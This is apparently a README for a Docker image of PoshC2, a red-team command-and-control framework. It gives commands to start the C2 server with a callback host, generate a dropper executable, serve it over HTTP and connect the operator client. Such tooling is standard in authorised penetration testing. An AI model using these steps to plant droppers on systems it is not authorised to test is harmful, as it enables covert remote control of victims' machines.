# Docker PoshC2

PoshC2 is a proxy aware C2 framework used to aid penetration testers with red teaming, post-exploitation and lateral movement. This is a dockerized version of it on the top of an Ubuntu box with an entrypoint script to pass environment variables and update the main server config when running the docker image.

## Getting Started


### Pull remote image

```
docker image pull cyb3rward0g/docker-poshc2:20210315
```

### tag docker image

```
docker tag cyb3rward0g/docker-poshc2:20210315 poshc2
```

### Run the Posh server

```
sudo docker run -ti -d -p 443:443 -e PAYLOAD_COMMS_HOST=https://192.168.2.7 --name poshc2 poshc2
sudo docker exec -ti poshc2 bash
posh-project -n rce
posh-server
```

### Download Poshc2 Payload of Interest

```
sudo docker cp psh:/var/poshc2/rce/payloads/dropper_cs_ps_v4.exe .
```

### Host Payoad

```
python3 -m http.server 
```

### Run the Posh client

```
sudo docker exec -ti poshc2 bash
posh -u wardog
```